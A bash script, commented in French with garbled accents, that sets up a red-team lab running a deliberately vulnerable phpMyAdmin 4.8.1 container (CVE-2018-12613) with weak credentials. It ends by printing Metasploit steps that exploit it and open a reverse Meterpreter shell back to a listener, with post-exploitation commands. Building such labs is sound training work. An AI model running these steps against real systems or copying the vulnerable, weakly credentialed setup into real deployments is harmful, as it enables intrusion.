#!/bin/bash

###############################################################################
# Iron4Software Red Team Lab - phpMyAdmin 4.8.1 Docker
# CVE-2018-12613 - LFI ‚Üí RCE
# Exploitation: Metasploit exploit/multi/http/phpmyadmin_lfi_rce
###############################################################################

set -e

echo "========================================================"
echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Docker"
echo "  CVE-2018-12613 (LFI ‚Üí RCE)"
echo "========================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Ce script doit √™tre ex√©cut√© en tant que root (sudo)"
    exit 1
fi

echo "[1/6] V√©rification de Docker..."
if ! command -v docker &> /dev/null; then
    echo "‚ö†Ô∏è  Docker non install√©, installation..."
    apt update -qq
    apt install -y docker.io > /dev/null 2>&1
    systemctl start docker
    systemctl enable docker
    echo "‚úÖ Docker install√©"
else
    echo "‚úÖ Docker d√©tect√©"
    systemctl start docker 2>/dev/null || true
fi

echo "[2/6] V√©rification de MySQL/MariaDB sur l'h√¥te..."
# D√©tecter MySQL existant pour Roundcube
if systemctl is-active --quiet mysql || systemctl is-active --quiet mariadb; then
    echo "‚úÖ MySQL/MariaDB actif (utilis√© par Roundcube)"
    DB_HOST="host.docker.internal"
elif pgrep -x mysqld > /dev/null || pgrep -x mariadbd > /dev/null; then
    echo "‚úÖ MySQL/MariaDB d√©tect√© en processus"
    DB_HOST="host.docker.internal"
else
    echo "‚ö†Ô∏è  Aucun MySQL d√©tect√©, cr√©ation d'un container MySQL..."
    DB_HOST="mysql_db"
    
    # Lancer MySQL dans un container s√©par√©
    docker run -d \
        --name mysql_db \
        --restart unless-stopped \
        -e MYSQL_ROOT_PASSWORD=rootpass \
        -e MYSQL_DATABASE=phpmyadmin \
        -e MYSQL_USER=admin \
        -e MYSQL_PASSWORD=admin \
        mysql:5.7 > /dev/null 2>&1 || true
    
    echo "‚úÖ MySQL container cr√©√©"
    echo "   Attente d√©marrage MySQL..."
    sleep 10
fi

echo "[3/6] Arr√™t du container existant (si pr√©sent)..."
docker stop phpmyadmin-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln 2>/dev/null || true
echo "‚úÖ Nettoyage effectu√©"

echo "[4/6] Lancement phpMyAdmin 4.8.1 vuln√©rable..."

# D√©terminer le port (8080 par d√©faut, ou 80 si libre)
PORT=8080
if ! netstat -tlnp | grep -q ":80 " 2>/dev/null; then
    PORT=80
    echo "   Port 80 libre, utilisation du port 80"
else
    echo "   Port 80 occup√©, utilisation du port 8080"
fi

# Lancer phpMyAdmin 4.8.1
docker run -d \
    --name phpmyadmin-vuln \
    --restart unless-stopped \
    --add-host=host.docker.internal:host-gateway \
    -e PMA_HOST="${DB_HOST}" \
    -e PMA_PORT=3306 \
    -e PMA_ARBITRARY=1 \
    -e UPLOAD_LIMIT=300M \
    -p ${PORT}:80 \
    phpmyadmin/phpmyadmin:4.8.1

if [ $? -eq 0 ]; then
    echo "‚úÖ phpMyAdmin 4.8.1 lanc√©"
else
    echo "‚ùå Erreur lors du lancement"
    exit 1
fi

echo "[5/6] Attente du d√©marrage (10 secondes)..."
sleep 10

echo "[6/6] V√©rification..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:${PORT}/ 2>/dev/null)

SERVER_IP=$(hostname -I | awk '{print $1}')

echo ""
echo "========================================================"
echo "  ‚úÖ Installation termin√©e avec succ√®s !"
echo "========================================================"
echo ""
echo "üìä Configuration :"
echo "   Container      : phpmyadmin-vuln"
echo "   Version        : phpMyAdmin 4.8.1 (VULNERABLE)"
echo "   CVE            : CVE-2018-12613"
echo "   Port           : $PORT"
echo "   IP Serveur     : $SERVER_IP"
echo ""
echo "üåê URLs d'acc√®s :"
echo "   Local          : http://localhost:${PORT}/"
echo "   R√©seau         : http://${SERVER_IP}:${PORT}/"
echo "   Depuis Kali    : http://mail.iron4software.local:${PORT}/"
echo ""
echo "üîê Credentials MySQL :"
echo "   User: admin"
echo "   Pass: admin"
echo "   (ou root / rootpass si MySQL container)"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "‚úÖ phpMyAdmin accessible (HTTP 200)"
else
    echo "‚ö†Ô∏è  phpMyAdmin ne r√©pond pas encore (HTTP $HTTP_CODE)"
    echo "   Attendez 30 secondes et testez: curl http://localhost:${PORT}/"
fi

echo ""
echo "üê≥ Gestion du container :"
echo "   Voir logs       : docker logs -f phpmyadmin-vuln"
echo "   Arr√™ter         : docker stop phpmyadmin-vuln"
echo "   D√©marrer        : docker start phpmyadmin-vuln"
echo "   Supprimer       : docker rm -f phpmyadmin-vuln"
echo "   Recr√©er         : docker restart phpmyadmin-vuln"
echo ""
echo "========================================================"
echo "  üî• EXPLOITATION AVEC METASPLOIT"
echo "========================================================"
echo ""
echo "1Ô∏è‚É£  Configurer pfSense Port Forwarding :"
echo "    Interface: KALI ‚Üí Port ${PORT} ‚Üí ${SERVER_IP}:${PORT}"
echo ""
echo "2Ô∏è‚É£  Tester l'acc√®s depuis Kali :"
echo "    curl http://mail.iron4software.local:${PORT}/"
echo ""
echo "3Ô∏è‚É£  Exploitation Metasploit :"
echo "    msfconsole -q"
echo "    use exploit/multi/http/phpmyadmin_lfi_rce"
echo "    set RHOSTS mail.iron4software.local"
echo "    set RPORT ${PORT}"
echo "    set TARGETURI /"
echo "    set USERNAME admin"
echo "    set PASSWORD admin"
echo "    set LHOST 192.168.100.10"
echo "    set LPORT 4444"
echo "    check"
echo "    exploit"
echo ""
echo "4Ô∏è‚É£  Post-Exploitation :"
echo "    meterpreter> sysinfo"
echo "    meterpreter> getuid"
echo "    meterpreter> shell"
echo ""
echo "========================================================"
echo "  üê≥ phpMyAdmin 4.8.1 Docker - CVE-2018-12613 - PR√äT"
echo "========================================================"
echo ""
echo "üìö Ressources :"
echo "   CVE-2018-12613  : https://nvd.nist.gov/vuln/detail/CVE-2018-12613"
echo "   Docker Hub      : https://hub.docker.com/r/phpmyadmin/phpmyadmin"
echo "   MITRE ATT&CK    : T1190 (Exploit Public-Facing Application)"
echo ""
